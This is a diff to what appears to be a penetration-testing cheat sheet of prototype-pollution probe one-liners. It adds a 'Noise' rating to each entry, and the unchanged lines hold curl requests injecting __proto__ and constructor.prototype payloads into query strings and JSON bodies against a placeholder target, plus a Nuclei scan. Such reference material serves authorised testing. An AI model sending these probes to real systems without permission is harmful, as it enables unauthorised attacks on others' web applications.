@@ -10,7 +10,7 @@ Short discovery and probe one-liners for JavaScript prototype-pollution surfaces
 grep -Ei "(__proto__|constructor|prototype)" urls.txt | sort -u
 ```
 
-**Tool:** grep · **Platform:** Linux · **Tags:** Web, prototype pollution · **Context:** User
+**Tool:** grep · **Platform:** Linux · **Tags:** Web, prototype pollution · **Context:** User · **Noise:** Moderate
 
 ## Query-string __proto__ probe
 
@@ -18,7 +18,7 @@ grep -Ei "(__proto__|constructor|prototype)" urls.txt | sort -u
 curl -sk "https://<TARGET>/?__proto__[polluted]=true"
 ```
 
-**Tool:** curl · **Platform:** Any · **Tags:** Web, prototype pollution · **Context:** No auth
+**Tool:** curl · **Platform:** Any · **Tags:** Web, prototype pollution · **Context:** No auth · **Noise:** Moderate
 
 ## Constructor prototype probe
 
@@ -26,7 +26,7 @@ curl -sk "https://<TARGET>/?__proto__[polluted]=true"
 curl -sk "https://<TARGET>/?constructor[prototype][polluted]=true"
 ```
 
-**Tool:** curl · **Platform:** Any · **Tags:** Web, prototype pollution · **Context:** No auth
+**Tool:** curl · **Platform:** Any · **Tags:** Web, prototype pollution · **Context:** No auth · **Noise:** Moderate
 
 ## JSON body probe
 
@@ -34,7 +34,7 @@ curl -sk "https://<TARGET>/?constructor[prototype][polluted]=true"
 curl -sk -X POST https://<TARGET>/<ENDPOINT> -H "Content-Type: application/json" -d '{"__proto__":{"polluted":"true"}}'
 ```
 
-**Tool:** curl · **Platform:** Any · **Tags:** Web, prototype pollution, JSON · **Context:** Authenticated
+**Tool:** curl · **Platform:** Any · **Tags:** Web, prototype pollution, JSON · **Context:** Authenticated · **Noise:** Moderate
 
 ## Nuclei prototype pollution templates
 
@@ -42,7 +42,7 @@ curl -sk -X POST https://<TARGET>/<ENDPOINT> -H "Content-Type: application/json"
 nuclei -u https://<TARGET> -tags prototype-pollution -silent
 ```
 
-**Tool:** Nuclei · **Platform:** Linux · **Tags:** Web, prototype pollution · **Context:** No auth
+**Tool:** Nuclei · **Platform:** Linux · **Tags:** Web, prototype pollution · **Context:** No auth · **Noise:** Moderate
 
 ---
 
